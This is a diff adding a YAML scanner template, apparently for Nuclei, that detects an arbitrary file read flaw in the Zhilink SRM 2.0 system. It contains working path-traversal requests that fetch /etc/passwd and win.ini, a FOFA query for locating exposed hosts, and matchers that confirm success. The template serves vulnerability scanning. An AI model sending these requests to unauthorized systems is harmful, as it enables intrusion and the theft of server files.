@@ -1,0 +1,28 @@
+id: zhilink-srm-download-fileread
+info:
+  name: 智联云仓 SRM 2.0 download - fileread
+  author: leadlife
+  severity: high
+  description: 系统未对读取/下载文件的文件目录做限制，攻击者利用此漏洞可直接读取web目录下任意文件，比如配置文件、数据库文件等，甚至直接获取服务器上任意文件内容。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%99%BA%E4%BA%92%E8%81%94(%E6%B7%B1%E5%9C%B3)%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8SRM%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87%E7%B3%BB%E7%BB%9Fdownload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title=="SRM 2.0"
+    repair: 使用安全设备封禁路路径，等待发布补丁
+  tags: srm,fileread,zhilink
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=/etc/passwd"
+      - "{{BaseURL}}/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:/windows/win.ini"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
